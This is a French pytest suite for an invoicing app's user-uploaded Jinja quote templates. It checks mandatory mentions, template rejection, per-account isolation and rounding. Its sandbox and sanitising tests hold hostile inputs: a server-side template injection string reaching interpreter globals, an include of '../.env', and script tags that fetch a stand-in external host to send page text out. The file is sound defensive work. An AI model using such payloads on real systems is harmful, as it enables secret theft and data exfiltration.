"""Le gabarit de devis téléversé par l'artisan.

Ce qui est testé ici, c'est la seule partie qui doit être juste à tous les coups :
**ce qu'on refuse et ce qu'on signale**. La beauté d'une mise en page se juge à l'œil
sur le PDF ; le fait qu'un gabarit ne puisse pas lire la configuration du serveur, ou
qu'on prévienne quand un devis perd son SIRET, ne se juge pas à l'œil du tout.

Aucune clé, aucun Firebase, aucun réseau : sans identifiants, `gabarits` range en
mémoire et `render_html` n'a besoin de rien d'autre que Jinja.
"""

from __future__ import annotations

from decimal import Decimal

import pytest

from app import gabarits
from app.config import get_config
from app.gabarits import GabaritRefuse
from app.pdf import render_html


@pytest.fixture(autouse=True)
def etat_neuf():
    """Ni configuration ni gabarit ne doivent survivre d'un cas au suivant."""
    get_config.cache_clear()
    gabarits.vider_la_memoire()
    yield
    get_config.cache_clear()
    gabarits.vider_la_memoire()


# Un gabarit minimal mais honnête : il imprime les quatorze mentions attendues.
# Sert de témoin — quand un test échoue, il doit être clair que c'est le sujet du
# test qui a bougé, pas le gabarit d'appui.
GABARIT_CONFORME = """<!doctype html><html><body>
<h1>Devis {{ devis.numero }}</h1>
<p>{{ e.nom }} — {{ e.adresse }}, {{ e.code_postal_ville }}</p>
<p>SIRET {{ e.siret }} · TVA {{ e.tva_intracom }}</p>
<p>{{ e.assurance }} — police {{ e.assurance_police }}</p>
<p>Émis le {{ devis.date_emission | date_fr }}, valable jusqu'au {{ devis.date_validite | date_fr }}</p>
<p>Client : {{ devis.client.nom }}</p>
<table>{% for ligne in devis.lignes %}<tr><td>{{ ligne.designation }}</td></tr>{% endfor %}</table>
<p>Total HT {{ devis.total_ht | montant }}</p>
<p>TVA {{ devis.montant_tva | montant }}</p>
<p>Total TTC {{ devis.total_ttc | montant }}</p>
<p>Bon pour accord</p>
</body></html>"""


# ---------------------------------------------------------------------------
# Le contrôle des mentions obligatoires
# ---------------------------------------------------------------------------


def test_le_gabarit_livre_passe_tous_les_controles():
    """L'étalon du contrôle. S'il échoue, c'est le vérificateur qui est faux — pas
    le document, qui est celui qu'on montre aux artisans depuis le début."""
    exemple = gabarits.devis_exemple()

    assert gabarits.controler_les_mentions(render_html(exemple), exemple) == []


def test_un_gabarit_conforme_ne_signale_rien():
    _, _, manquantes = gabarits.valider(GABARIT_CONFORME)

    assert manquantes == []


def test_le_siret_absent_est_signale():
    """La mention la plus facile à perdre en refaisant sa mise en page, et celle qui
    disqualifie le devis. On la cherche par sa valeur, pas par le mot « SIRET »."""
    sans_siret = GABARIT_CONFORME.replace("SIRET {{ e.siret }} · ", "")

    _, _, manquantes = gabarits.valider(sans_siret)

    assert manquantes == ["Le numéro SIRET"]


def test_le_mot_siret_seul_ne_suffit_pas():
    """Un gabarit qui écrit « SIRET : » sans imprimer la valeur reste non conforme.
    C'est tout l'intérêt de chercher les valeurs plutôt que les libellés."""
    libelle_nu = GABARIT_CONFORME.replace("SIRET {{ e.siret }}", "SIRET")

    _, _, manquantes = gabarits.valider(libelle_nu)

    assert "Le numéro SIRET" in manquantes


def test_les_totaux_absents_sont_signales():
    sans_totaux = (GABARIT_CONFORME
                   .replace("<p>Total HT {{ devis.total_ht | montant }}</p>", "")
                   .replace("<p>Total TTC {{ devis.total_ttc | montant }}</p>", ""))

    _, _, manquantes = gabarits.valider(sans_totaux)

    assert manquantes == ["Le total HT", "Le total TTC"]


def test_les_insecables_du_formatage_ne_masquent_pas_un_total():
    """Le filtre `montant` sépare les milliers par une espace fine insécable. Un
    contrôle naïf ne retrouverait jamais « 4 546,45 » dans le document rendu et
    signalerait un total manquant qui est pourtant bien imprimé."""
    exemple = gabarits.devis_exemple()
    rendu = render_html(exemple, gabarit=GABARIT_CONFORME)

    assert "\u202f" in rendu, "le témoin n'exerce pas le cas : aucune fine insécable"
    assert "Le total HT" not in gabarits.controler_les_mentions(rendu, exemple)


# ---------------------------------------------------------------------------
# Ce qui est refusé — avant l'enregistrement, jamais devant l'artisan
# ---------------------------------------------------------------------------


def test_un_gabarit_vide_est_refuse():
    with pytest.raises(GabaritRefuse, match="vide"):
        gabarits.valider("   \n  ")


def test_une_syntaxe_jinja_fautive_est_refusee():
    """Refusée à l'enregistrement. Le laisser passer reviendrait à découvrir la faute
    au moment où l'artisan veut son PDF devant un client."""
    with pytest.raises(GabaritRefuse, match="rendu"):
        gabarits.valider("<p>{% for ligne in devis.lignes %}{{ ligne.designation }}</p>")


def test_un_gabarit_trop_gros_est_refuse(monkeypatch):
    monkeypatch.setenv("MAX_GABARIT_KO", "1")
    get_config.cache_clear()

    with pytest.raises(GabaritRefuse, match="dépasse"):
        gabarits.valider("<p>" + "x" * 2048 + "</p>")


# ---------------------------------------------------------------------------
# Le bac à sable — un gabarit est du code qu'on n'a pas écrit
# ---------------------------------------------------------------------------


def test_un_gabarit_ne_peut_pas_atteindre_l_interpreteur():
    """Sans bac à sable, `__class__.__init__.__globals__` ouvre l'interpréteur depuis
    le gabarit — donc la configuration, donc les clés API. C'est la vraie frontière
    de sécurité de cette fonctionnalité, et elle doit être testée comme telle."""
    with pytest.raises(GabaritRefuse):
        gabarits.valider("<p>{{ devis.__class__.__init__.__globals__ }}</p>")


def test_un_gabarit_ne_peut_pas_lire_un_fichier_du_serveur():
    """`loader=None` fait échouer `include` : aucun gabarit ne lira le `.env`."""
    with pytest.raises(GabaritRefuse):
        gabarits.valider("<p>{% include '../.env' %}</p>")


@pytest.mark.parametrize("gabarit", [
    "<div><script>fetch('https://ailleurs.example/' + document.body.innerText)</script></div>",
    "<div><script src='https://ailleurs.example/x.js'></script></div>",
    '<div onload="fetch(\'https://ailleurs.example\')">x</div>',
])
def test_le_javascript_est_retire_du_document(gabarit):
    """Chromium exécute vraiment ce qu'on lui donne. Un devis est un document : rien
    de ce qu'un script pourrait faire n'y a sa place, et un `fetch` ferait dépendre
    le rendu du réseau au moment précis où on montre le devis à un artisan."""
    propre = gabarits.nettoyer(gabarit)

    assert "ailleurs.example" not in propre
    assert "script" not in propre.lower()
    assert "onload" not in propre.lower()


def test_le_nettoyage_epargne_le_contenu_legitime():
    """Un filtre qui emporterait la mise en page avec les scripts serait pire que le
    problème qu'il règle."""
    gabarit = "<style>.doc { color: #1b1a17 }</style><p class='doc'>Total {{ devis.total_ht }}</p>"

    assert gabarits.nettoyer(gabarit) == gabarit


# ---------------------------------------------------------------------------
# Le stockage, dans son repli hors-Firebase
# ---------------------------------------------------------------------------


def test_le_gabarit_pose_revient_a_son_proprietaire():
    gabarits.enregistrer("artisan-1", "mon-devis.html", GABARIT_CONFORME)

    pose = gabarits.lire("artisan-1")
    assert pose is not None
    assert pose.nom == "mon-devis.html"
    assert pose.conforme


def test_deux_artisans_ne_se_partagent_pas_leur_gabarit():
    """Le seul intérêt d'avoir introduit des comptes. S'il ne tient pas, la
    fonctionnalité entière est à retirer."""
    gabarits.enregistrer("artisan-1", "a.html", GABARIT_CONFORME)

    assert gabarits.lire("artisan-2") is None
    assert gabarits.html_pour("artisan-2") is None


def test_sans_gabarit_pose_on_rend_sur_celui_livre():
    """`None` et pas une chaîne vide : c'est ce que `pdf.render` attend pour reprendre
    le gabarit livré."""
    assert gabarits.html_pour("artisan-jamais-vu") is None


def test_retirer_son_gabarit_rend_la_mise_en_page_livree():
    gabarits.enregistrer("artisan-1", "a.html", GABARIT_CONFORME)

    gabarits.supprimer("artisan-1")

    assert gabarits.html_pour("artisan-1") is None


def test_les_mentions_manquantes_sont_conservees_avec_le_gabarit():
    """L'artisan doit retrouver l'avertissement en rouvrant l'écran, pas seulement à
    la seconde où il téléverse."""
    sans_siret = GABARIT_CONFORME.replace("SIRET {{ e.siret }} · ", "")

    gabarits.enregistrer("artisan-1", "a.html", sans_siret)

    pose = gabarits.lire("artisan-1")
    assert not pose.conforme
    assert pose.mentions_manquantes == ["Le numéro SIRET"]


def test_le_html_enregistre_est_celui_qui_a_ete_nettoye():
    """Ce qu'on stocke est ce qu'on rendra : le nettoyage ne doit pas être une
    politesse d'affichage refaite à chaque PDF."""
    gabarits.enregistrer("artisan-1", "a.html", GABARIT_CONFORME + "<script>alert(1)</script>")

    assert "script" not in gabarits.html_pour("artisan-1").lower()


# ---------------------------------------------------------------------------
# Le rendu, avec gabarit
# ---------------------------------------------------------------------------


def test_le_gabarit_recoit_le_devis_et_les_filtres():
    """Le contrat offert à l'artisan qui écrit sa mise en page."""
    rendu = render_html(
        gabarits.devis_exemple(),
        gabarit="<p>{{ devis.numero }}|{{ e.nom }}|{{ devis.total_ttc | euro }}</p>",
    )

    assert "DEV-EXEMPLE-0001" in rendu
    assert "5\u202f001,10\u202f€" in rendu


def test_le_devis_d_exemple_arrondit_comme_un_vrai_devis():
    """Le devis d'exemple part en aperçu sous les yeux d'un artisan : il doit
    s'additionner comme le vrai, donc suivre ROUND_HALF_UP.

    Ce cas n'est pas théorique, c'est la raison d'être du test : la TVA de ce
    devis tombe pile sur la demi-unité (4 546,45 x 0,10 = 454,645), là où le
    `quantize()` nu de Decimal arrondit au pair le plus proche et donne 454,64.
    Un centime, mais un total qui ne tombe pas juste quand le client le refait
    à la main."""
    devis = gabarits.devis_exemple()

    assert devis.total_ht == Decimal("4546.45")
    assert devis.montant_tva == Decimal("454.65")
    assert devis.total_ttc == Decimal("5001.10")
    assert devis.total_ht == sum(ligne.total_ht for ligne in devis.lignes)


def test_sans_gabarit_le_rendu_est_celui_d_avant():
    """La garantie de non-régression : l'ajout ne doit rien changer au chemin nominal."""
    exemple = gabarits.devis_exemple()

    assert render_html(exemple) == render_html(exemple, gabarit=None)


def test_un_visiteur_anonyme_n_interroge_pas_la_base(monkeypatch):
    """Le chemin le plus chaud du produit : chaque PDF passe par `html_pour`, et en
    démonstration la plupart des rendus sont anonymes. Quand Firebase est actif,
    `local` désigne quelqu'un qui n'est pas connecté — il ne possède rien, et aller
    le demander à Firestore serait un aller-retour réseau pour rien."""
    monkeypatch.setenv("FIREBASE_CREDENTIALS_JSON", '{"type": "service_account"}')
    get_config.cache_clear()

    def interdit(_uid):
        raise AssertionError("Firestore ne doit pas être interrogé pour un anonyme")

    monkeypatch.setattr(gabarits, "lire", interdit)

    assert gabarits.html_pour("local") is None
